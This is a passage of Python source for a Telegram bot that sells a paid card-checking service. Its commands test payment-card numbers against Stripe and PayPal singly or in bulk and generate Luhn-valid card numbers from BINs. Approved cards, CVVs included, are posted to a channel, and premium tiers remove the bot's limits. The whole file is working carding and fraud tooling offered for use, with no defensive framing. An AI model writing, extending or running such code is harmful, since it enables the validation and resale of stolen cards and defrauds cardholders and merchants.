👤 Welcome, {user_data['full_name']}!
🎫 Account Type: {user_data['user_type']}
💰 Subscription: {remaining}
📅 Expiry: {expiry_date}

🛒 AVAILABLE SERVICES:
• Stripe Checker ✅
• PayPal Checker ✅  
• Braintree Checker ❌
• Card Generator 🎰

💡 FEATURES:
• Fast processing ⚡
• Real-time results 📊
• Multiple gateways 🌐
• Premium support 💎

📚 Use /help to see all commands
🔑 Use /subscription for premium plans

⚡ Powered by @mhitzxg & @pr0xy_xd
"""
    
    bot.reply_to(msg, welcome_message, reply_markup=keyboard, parse_mode='Markdown')

@bot.message_handler(commands=['info'])
def info_command(msg):
    user_id = msg.from_user.id
    user_data = get_user_info(user_id)
    remaining, expiry_date = get_subscription_info(user_id)
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    info_message = f"""
╔═══════════════════════╗
        👤 USER INFORMATION 👤
╚═══════════════════════╝

👤 Name: {user_data['full_name']}
🆔 User ID: `{user_data['user_id']}`
📱 Username: {user_data['username']}
🎫 Account Type: {user_data['user_type']}

💰 Subscription: {remaining}
📅 Expiry Date: {expiry_date}
⏰ Current Time: {current_time}

🌐 STATUS 🌐
🔌 Proxy: {check_proxy_status()}
🔓 Authorized: {'Yes ✅' if is_authorized(msg) else 'No ❌'}

⚡ Powered by @mhitzxg
"""
    
    bot.reply_to(msg, info_message, parse_mode='Markdown')

@bot.message_handler(commands=['register'])
def register_command(msg):
    if msg.chat.type != "private":
        return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚠️ PRIVATE CHAT REQUIRED ⚠️
╚═══════════════════════╝

• Please use this command in private chat with the bot
• Click on the bot name and start private chat""")
    
    user_id = msg.from_user.id
    
    # Check if already registered
    if is_authorized(msg):
        return bot.reply_to(msg, """
╔═══════════════════════╗
  ✅ ALREADY REGISTERED ✅
╚═══════════════════════╝

• You are already registered and authorized
• You can use all free features""")
    
    # Register user
    first_name = msg.from_user.first_name or "Unknown"
    if add_free_user(user_id, first_name):
        bot.reply_to(msg, f"""
╔═══════════════════════╗
  ✅ REGISTRATION SUCCESS ✅
╚═══════════════════════╝

👤 Welcome {first_name}!
🎫 You are now registered as a free user

🛒 FREE FEATURES:
• 25 cards per check 📊
• Standard speed 🐢
• Basic gateways access 🔓

💡 COMMANDS:
• /ch - Check Stripe cards
• /pp - Check PayPal cards
• /gen - Generate cards

💎 Want more features?
Use /subscription for premium plans!

⚡ Powered by @mhitzxg""")
    else:
        bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ REGISTRATION FAILED ❌
╚═══════════════════════╝

• Failed to register your account
• Please try again or contact support
• Contact: @mhitzxg""")

@bot.message_handler(commands=['subscription'])
def subscription_command(msg):
    subscription_message = """
╔═══════════════════════╗
        💎 PREMIUM PLANS 💎
╚═══════════════════════╝

💰 PREMIUM FEATURES:
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀
• No limitations ✅
• Remove all cooldowns ⏰

📋 PREMIUM PLANS:
• 7 days - $3 💵
• 30 days - $10 💵

🎫 HOW TO GET PREMIUM:
1. Contact @mhitzxg
2. Choose your plan
3. Make payment
4. Receive premium key
5. Use /redeem <key>

🔓 FREE TIER:
• 25 cards per check 📊
• Standard speed 🐢
• Cooldown periods ⏰

⚡ Upgrade now for better experience!
"""
    
    bot.reply_to(msg, subscription_message, parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_command(msg):
    if msg.chat.type != "private":
        return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚠️ PRIVATE CHAT REQUIRED ⚠️
╚═══════════════════════╝

• Please use this command in private chat with the bot
• Click on the bot name and start private chat""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/redeem <premium_key>`
• Example: `/redeem ABC123DEF456GHI7`""")
        
        key = parts[1].strip().upper()
        user_id = msg.from_user.id
        first_name = msg.from_user.first_name or "Unknown"
        
        # Check if key is valid
        key_data = is_key_valid(key)
        if not key_data:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ INVALID KEY ❌
╚═══════════════════════╝

• The premium key is invalid or already used
• Please check the key and try again
• Contact @mhitzxg for assistance""")
        
        # Add premium subscription
        validity_days = key_data['validity_days']
        if add_premium(user_id, first_name, validity_days) and mark_key_as_used(key, user_id):
            expiry_date = datetime.now() + timedelta(days=validity_days)
            expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
            
            bot.reply_to(msg, f"""
╔═══════════════════════╗
  ✅ PREMIUM ACTIVATED ✅
╚═══════════════════════╝

🎉 Congratulations {first_name}!
💎 You are now a Premium User!

📅 Subscription: {validity_days} days
⏰ Expiry Date: {expiry_str}

✨ PREMIUM FEATURES UNLOCKED:
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀
• No limitations ✅
• All gateways access 🌐

⚡ Enjoy your premium experience!
🔧 Powered by @mhitzxg""")
            
            # Notify admin
            notify_admin(f"""
🔄 PREMIUM ACTIVATION
👤 User: {first_name} (ID: {user_id})
🔑 Key: {key}
📅 Duration: {validity_days} days
⏰ Expiry: {expiry_str}""")
        else:
            bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ ACTIVATION FAILED ❌
╚═══════════════════════╝

• Failed to activate premium subscription
• Please try again or contact support
• Contact: @mhitzxg""")
        
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}
• Please try again or contact support""")

# ---------------- Card Checking Commands ---------------- #

@bot.message_handler(commands=['ch'])
def check_stripe_command(msg):
    """Check single card using Stripe"""
    if not is_authorized(msg):
        return bot.reply_to(msg, """
╔═══════════════════════╗
   ❌ ACCESS DENIED ❌
╚═══════════════════════╝

• You are not authorized to use this bot
• Use /register to get free access
• Contact @mhitzxg for premium""")
    
    # Check cooldown for free users
    if check_cooldown(msg.from_user.id, "stripe_check"):
        remaining_time = int(FREE_USER_COOLDOWN[str(msg.from_user.id)]["stripe_check"] - time.time())
        return bot.reply_to(msg, f"""
╔═══════════════════════╗
  ⏰ COOLDOWN ACTIVE ⏰
╚═══════════════════════╝

• Please wait {remaining_time} seconds before checking again
• Upgrade to premium to remove cooldowns
• Use /subscription for premium plans""")
    
    # Set cooldown for free users (60 seconds)
    set_cooldown(msg.from_user.id, "stripe_check", 60)
    
    try:
        parts = msg.text.split()
        if len(parts) < 2 and not msg.reply_to_message:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/ch <card_details>`
• Or reply to a message with `/ch`

📝 CARD FORMAT:
• `cc|mm|yy|cvv`
• `4556737586899855|12|2026|123`

💡 Example:
• `/ch 4556737586899855|12|2026|123`""")
        
        # Get card details
        if msg.reply_to_message:
            card_text = msg.reply_to_message.text
        else:
            card_text = ' '.join(parts[1:])
        
        # Normalize card
        card = normalize_card(card_text)
        if not card:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ INVALID CARD FORMAT ❌
╚═══════════════════════╝

• Please provide valid card details
• Format: `cc|mm|yy|cvv`

💡 Example:
• `4556737586899855|12|2026|123`
• Reply to a message containing card details with `/ch`""")
        
        # Send processing message
        processing_msg = bot.reply_to(msg, """
╔═══════════════════════╗
  🔄 PROCESSING CARD...
╚═══════════════════════╝

• Gateway: Stripe
• Status: Checking...
• Please wait... ⏳""")
        
        # Check card using Stripe
        result = check_card_stripe(card)
        
        # Parse result
        if "APPROVED" in result:
            status = "✅ APPROVED"
            emoji = "💳"
            status_text = "Card is live and approved"
        elif "DECLINED" in result:
            status = "❌ DECLINED" 
            emoji = "❌"
            status_text = "Card was declined"
        else:
            status = "⚠️ UNKNOWN"
            emoji = "❓"
            status_text = "Unknown response from gateway"
        
        # Extract card info
        card_parts = card.split('|')
        if len(card_parts) >= 4:
            cc = card_parts[0]
            mm = card_parts[1]
            yy = card_parts[2]
            cvv = card_parts[3]
            
            # Mask card number
            masked_cc = cc[:6] + "X" * 6 + cc[12:]
            
            result_message = f"""
╔═══════════════════════╗
        {emoji} CARD RESULT {emoji}
╚═══════════════════════╝

💳 CARD INFORMATION:
• Number: `{masked_cc}`
• Expiry: {mm}/{yy}
• CVV: {cvv}

📊 CHECK RESULT:
• Status: {status}
• Gateway: Stripe
• Response: {status_text}

{result}

⚡ Powered by @mhitzxg"""
        else:
            result_message = f"""
╔═══════════════════════╗
        {emoji} CARD RESULT {emoji}
╚═══════════════════════╝

{result}

⚡ Powered by @mhitzxg"""
        
        # Edit the processing message with result
        bot.edit_message_text(
            result_message,
            msg.chat.id,
            processing_msg.message_id,
            parse_mode='Markdown'
        )
        
        # If card is approved, send to channel
        if "APPROVED" in result:
            notify_channel(f"""
🎯 APPROVED CARD FOUND!

💳 Card: `{masked_cc}`
📅 Expiry: {mm}/{yy}
🔑 CVV: {cvv}
🌐 Gateway: Stripe
👤 Checked by: {msg.from_user.first_name} (ID: {msg.from_user.id})

⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}""")
            
    except Exception as e:
        error_msg = bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error checking card: {str(e)}
• Please try again with valid card details""")
        
        # Try to edit the processing message if it exists
        try:
            bot.edit_message_text(
                f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error checking card: {str(e)}
• Please try again with valid card details""",
                msg.chat.id,
                processing_msg.message_id
            )
        except:
            pass

@bot.message_handler(commands=['mch'])
def mass_check_stripe(msg):
    """Mass check cards using Stripe"""
    if not is_authorized(msg):
        return bot.reply_to(msg, """
╔═══════════════════════╗
   ❌ ACCESS DENIED ❌
╚═══════════════════════╝

• You are not authorized to use this bot
• Use /register to get free access
• Contact @mhitzxg for premium""")
    
    # Check cooldown for free users
    if check_cooldown(msg.from_user.id, "mass_stripe_check"):
        remaining_time = int(FREE_USER_COOLDOWN[str(msg.from_user.id)]["mass_stripe_check"] - time.time())
        return bot.reply_to(msg, f"""
╔═══════════════════════╗
  ⏰ COOLDOWN ACTIVE ⏰
╚═══════════════════════╝

• Please wait {remaining_time} seconds before mass checking again
• Upgrade to premium to remove cooldowns
• Use /subscription for premium plans""")
    
    # Set cooldown for free users (120 seconds)
    set_cooldown(msg.from_user.id, "mass_stripe_check", 120)
    
    try:
        if not msg.reply_to_message:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Please reply to a message containing multiple cards
• Usage: Reply to message with `/mch`

📝 CARD FORMAT (one per line):
• `cc|mm|yy|cvv`
• `4556737586899855|12|2026|123`

💡 Example:
• Reply to a message with multiple card details""")
        
        card_text = msg.reply_to_message.text
        if not card_text:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ NO CARD DATA ❌
╚═══════════════════════╝

• The replied message doesn't contain any card data
• Please reply to a message with card details""")
        
        # Parse multiple cards
        cards = []
        lines = card_text.split('\n')
        for line in lines:
            card = normalize_card(line)
            if card:
                cards.append(card)
        
        if not cards:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ NO VALID CARDS ❌
╚═══════════════════════╝

• No valid card formats found in the message
• Format: `cc|mm|yy|cvv` (one per line)

💡 Example:
• `4556737586899855|12|2026|123`
• `5112345678901234|03|2025|456`""")
        
        # Limit for free users
        user_id = msg.from_user.id
        if not is_premium(user_id) and not is_admin(user_id):
            if len(cards) > 25:
                cards = cards[:25]  # Limit free users to 25 cards
        
        # Send processing message
        processing_msg = bot.reply_to(msg, f"""
╔═══════════════════════╗
  🔄 MASS CHECKING CARDS...
╚═══════════════════════╝

• Gateway: Stripe
• Cards: {len(cards)}
• Status: Processing... ⏳

⏰ Please wait, this may take a while...""")
        
        # Check cards using Stripe mass checker
        results = check_cards_stripe(cards)
        
        # Count results
        approved = 0
        declined = 0
        error = 0
        
        result_lines = []
        for i, (card, result) in enumerate(zip(cards, results), 1):
            card_parts = card.split('|')
            if len(card_parts) >= 4:
                cc = card_parts[0]
                mm = card_parts[1] 
                yy = card_parts[2]
                cvv = card_parts[3]
                masked_cc = cc[:6] + "X" * 6 + cc[12:]
                
                if "APPROVED" in result:
                    status = "✅ APPROVED"
                    approved += 1
                elif "DECLINED" in result:
                    status = "❌ DECLINED"
                    declined += 1
                else:
                    status = "⚠️ ERROR"
                    error += 1
                
                result_lines.append(f"• {masked_cc} - {status}")
        
        # Create result message
        result_message = f"""
╔═══════════════════════╗
        📊 MASS CHECK RESULTS
╚═══════════════════════╝

📈 STATISTICS:
• Total Cards: {len(cards)}
• ✅ Approved: {approved}
• ❌ Declined: {declined}  
• ⚠️ Errors: {error}

🔧 GATEWAY: Stripe
👤 Checked by: {msg.from_user.first_name}

📋 RESULTS:
{chr(10).join(result_lines[:20])}{f"{chr(10)}• ... and {len(result_lines) - 20} more" if len(result_lines) > 20 else ""}

⚡ Powered by @mhitzxg"""
        
        # Edit the processing message with results
        bot.edit_message_text(
            result_message,
            msg.chat.id,
            processing_msg.message_id,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        error_msg = bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error during mass check: {str(e)}
• Please try again with valid card details""")

@bot.message_handler(commands=['pp'])
def check_paypal_command(msg):
    """Check single card using PayPal"""
    if not is_authorized(msg):
        return bot.reply_to(msg, """
╔═══════════════════════╗
   ❌ ACCESS DENIED ❌
╚═══════════════════════╝

• You are not authorized to use this bot
• Use /register to get free access
• Contact @mhitzxg for premium""")
    
    # Check cooldown for free users
    if check_cooldown(msg.from_user.id, "paypal_check"):
        remaining_time = int(FREE_USER_COOLDOWN[str(msg.from_user.id)]["paypal_check"] - time.time())
        return bot.reply_to(msg, f"""
╔═══════════════════════╗
  ⏰ COOLDOWN ACTIVE ⏰
╚═══════════════════════╝

• Please wait {remaining_time} seconds before checking again
• Upgrade to premium to remove cooldowns
• Use /subscription for premium plans""")
    
    # Set cooldown for free users (60 seconds)
    set_cooldown(msg.from_user.id, "paypal_check", 60)
    
    try:
        parts = msg.text.split()
        if len(parts) < 2 and not msg.reply_to_message:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/pp <card_details>`
• Or reply to a message with `/pp`

📝 CARD FORMAT:
• `cc|mm|yy|cvv`
• `4556737586899855|12|2026|123`

💡 Example:
• `/pp 4556737586899855|12|2026|123`""")
        
        # Get card details
        if msg.reply_to_message:
            card_text = msg.reply_to_message.text
        else:
            card_text = ' '.join(parts[1:])
        
        # Normalize card
        card = normalize_card(card_text)
        if not card:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ INVALID CARD FORMAT ❌
╚═══════════════════════╝

• Please provide valid card details
• Format: `cc|mm|yy|cvv`

💡 Example:
• `4556737586899855|12|2026|123`
• Reply to a message containing card details with `/pp`""")
        
        # Send processing message
        processing_msg = bot.reply_to(msg, """
╔═══════════════════════╗
  🔄 PROCESSING CARD...
╚═══════════════════════╝

• Gateway: PayPal
• Status: Checking...
• Please wait... ⏳""")
        
        # Check card using PayPal
        result = check_card_paypal(card)
        
        # Parse result
        if "APPROVED" in result:
            status = "✅ APPROVED"
            emoji = "💳"
            status_text = "Card is live and approved"
        elif "DECLINED" in result:
            status = "❌ DECLINED" 
            emoji = "❌"
            status_text = "Card was declined"
        else:
            status = "⚠️ UNKNOWN"
            emoji = "❓"
            status_text = "Unknown response from gateway"
        
        # Extract card info
        card_parts = card.split('|')
        if len(card_parts) >= 4:
            cc = card_parts[0]
            mm = card_parts[1]
            yy = card_parts[2]
            cvv = card_parts[3]
            
            # Mask card number
            masked_cc = cc[:6] + "X" * 6 + cc[12:]
            
            result_message = f"""
╔═══════════════════════╗
        {emoji} CARD RESULT {emoji}
╚═══════════════════════╝

💳 CARD INFORMATION:
• Number: `{masked_cc}`
• Expiry: {mm}/{yy}
• CVV: {cvv}

📊 CHECK RESULT:
• Status: {status}
• Gateway: PayPal
• Response: {status_text}

{result}

⚡ Powered by @mhitzxg"""
        else:
            result_message = f"""
╔═══════════════════════╗
        {emoji} CARD RESULT {emoji}
╚═══════════════════════╝

{result}

⚡ Powered by @mhitzxg"""
        
        # Edit the processing message with result
        bot.edit_message_text(
            result_message,
            msg.chat.id,
            processing_msg.message_id,
            parse_mode='Markdown'
        )
        
        # If card is approved, send to channel
        if "APPROVED" in result:
            notify_channel(f"""
🎯 APPROVED CARD FOUND!

💳 Card: `{masked_cc}`
📅 Expiry: {mm}/{yy}
🔑 CVV: {cvv}
🌐 Gateway: PayPal
👤 Checked by: {msg.from_user.first_name} (ID: {msg.from_user.id})

⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}""")
            
    except Exception as e:
        error_msg = bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error checking card: {str(e)}
• Please try again with valid card details""")
        
        # Try to edit the processing message if it exists
        try:
            bot.edit_message_text(
                f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error checking card: {str(e)}
• Please try again with valid card details""",
                msg.chat.id,
                processing_msg.message_id
            )
        except:
            pass

@bot.message_handler(commands=['gen'])
def generate_cards(msg):
    """Generate valid cards using Luhn algorithm"""
    if not is_authorized(msg):
        return bot.reply_to(msg, """
╔═══════════════════════╗
   ❌ ACCESS DENIED ❌
╚═══════════════════════╝

• You are not authorized to use this bot
• Use /register to get free access
• Contact @mhitzxg for premium""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/gen <bin> [amount]`
• Example: `/gen 483318 10`

💡 BIN Examples:
• Visa: 483318, 455673
• MasterCard: 511234, 542523
• Amex: 378282, 371449""")
        
        bin_number = parts[1]
        amount = 10  # Default amount
        
        if len(parts) > 2:
            try:
                amount = int(parts[2])
                # Limit for free users
                if not is_premium(msg.from_user.id) and not is_admin(msg.from_user.id):
                    if amount > 25:
                        amount = 25
                        bot.reply_to(msg, """
╔═══════════════════════╗
  ⚠️ FREE USER LIMIT ⚠️
╚═══════════════════════╝

• Free users limited to 25 cards
• Upgrade to premium for unlimited cards
• Use /subscription for premium plans""")
            except ValueError:
                return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ INVALID AMOUNT ❌
╚═══════════════════════╝

• Please provide a valid number for amount
• Usage: `/gen <bin> [amount]`
• Example: `/gen 483318 15`""")
        
        # Validate BIN
        if not bin_number.isdigit() or len(bin_number) < 6:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ INVALID BIN ❌
╚═══════════════════════╝

• BIN must be at least 6 digits
• Only numbers are allowed

💡 Valid BIN Examples:
• Visa: 483318, 455673
• MasterCard: 511234, 542523
• Amex: 378282, 371449""")
        
        # Send processing message
        processing_msg = bot.reply_to(msg, f"""
╔═══════════════════════╗
  🔄 GENERATING CARDS...
╚═══════════════════════╝

• BIN: {bin_number}
• Amount: {amount}
• Status: Generating... ⏳""")
        
        # Generate cards
        generated_cards = card_generator.generate_cards(bin_number, amount)
        
        if not generated_cards:
            return bot.edit_message_text(
                """
╔═══════════════════════╗
  ❌ GENERATION FAILED ❌
╚═══════════════════════╝

• Failed to generate cards
• Please check the BIN and try again""",
                msg.chat.id,
                processing_msg.message_id
            )
        
        # Format cards for display
        cards_text = ""
        for i, card in enumerate(generated_cards, 1):
            cc = card['cc']
            mm = card['mm']
            yy = card['yy']
            cvv = card['cvv']
            cards_text += f"`{cc}|{mm}|{yy}|{cvv}`\n"
        
        result_message = f"""
╔═══════════════════════╗
        🎰 GENERATED CARDS 🎰
╚═══════════════════════╝

📊 GENERATION INFO:
• BIN: {bin_number}
• Amount: {amount}
• Valid: Luhn Algorithm ✅

💳 CARDS:
{cards_text}

💡 Usage:
• Copy and use with /ch or /pp
• Reply to this message with checking command

⚡ Powered by @mhitzxg"""
        
        # Edit the processing message with results
        bot.edit_message_text(
            result_message,
            msg.chat.id,
            processing_msg.message_id,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        error_msg = bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error generating cards: {str(e)}
• Please try again with valid BIN""")

# ---------------- Web Server for Health Check ---------------- #

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# ---------------- Main Bot Loop ---------------- #

def main():
    print("🤖 Bot starting...")
    
    # Start Flask server in a separate thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    print("🌐 Web server started on port 8080")
    
    # Start bot polling
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Bot error: {e}")
        print("🔄 Restarting in 5 seconds...")
        time.sleep(5)
        main()

if __name__ == "__main__":
    main()
